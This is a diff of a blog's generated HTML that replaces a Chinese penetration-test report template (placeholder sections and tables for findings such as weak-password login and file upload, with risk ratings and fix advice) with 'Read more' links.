-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E8%A7%84%E8%8C%83.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1445,53 +1306,14 @@
 <td align="center">18888888888</td>
 </tr>
 </tbody></table>
-<h3 id="测试结果综述"><a href="#测试结果综述" class="headerlink" title="测试结果综述"></a>测试结果综述</h3><p>对整体渗透测试结果进行综合评价，包括：整体概述，漏洞分布及风险</p>
-<h2 id="详细测试流程"><a href="#详细测试流程" class="headerlink" title="详细测试流程"></a>详细测试流程</h2><p>描述漏洞复现流程</p>
-<h4 id="例如：若口令登录漏洞"><a href="#例如：若口令登录漏洞" class="headerlink" title="例如：若口令登录漏洞"></a>例如：若口令登录漏洞</h4><p>流程描述+截图</p>
-<h4 id="例如：文件上传漏洞"><a href="#例如：文件上传漏洞" class="headerlink" title="例如：文件上传漏洞"></a>例如：文件上传漏洞</h4><p>流程描述+截图</p>
-<h2 id="风险评级"><a href="#风险评级" class="headerlink" title="风险评级"></a>风险评级</h2><p>通过整体漏洞评价，对网站/系统的风险进行评级及影响评级，简要描述即可。</p>
-<h2 id="漏洞详情及修复建议"><a href="#漏洞详情及修复建议" class="headerlink" title="漏洞详情及修复建议"></a>漏洞详情及修复建议</h2><p>（整理漏洞以及给出评价/修复建议）</p>
-<h3 id="例如：若口令登录漏洞-1"><a href="#例如：若口令登录漏洞-1" class="headerlink" title="例如：若口令登录漏洞"></a>例如：若口令登录漏洞</h3><table>
-<thead>
-<tr>
-<th align="left">风险评级</th>
-<th align="left">High</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">漏洞描述</td>
-<td align="left">漏洞描述</td>
-</tr>
-<tr>
-<td align="left">漏洞影响</td>
-<td align="left">漏洞影响</td>
-</tr>
-<tr>
-<td align="left">修复建议</td>
-<td align="left">修复建议</td>
-</tr>
-</tbody></table>
-<h3 id="例如：文件上传漏洞-1"><a href="#例如：文件上传漏洞-1" class="headerlink" title="例如：文件上传漏洞"></a>例如：文件上传漏洞</h3><table>
-<thead>
-<tr>
-<th align="left">风险评级</th>
-<th align="left">High</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">漏洞描述</td>
-<td align="left">漏洞描述</td>
-</tr>
-<tr>
-<td align="left">漏洞影响</td>
-<td align="left">漏洞影响</td>
-</tr>
-<tr>
-<td align="left">修复建议</td>
-<td align="left">修复建议</td>
-</tr>
-</tbody></table>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/pentest/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A%E6%A8%A1%E6%9D%BF.html#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
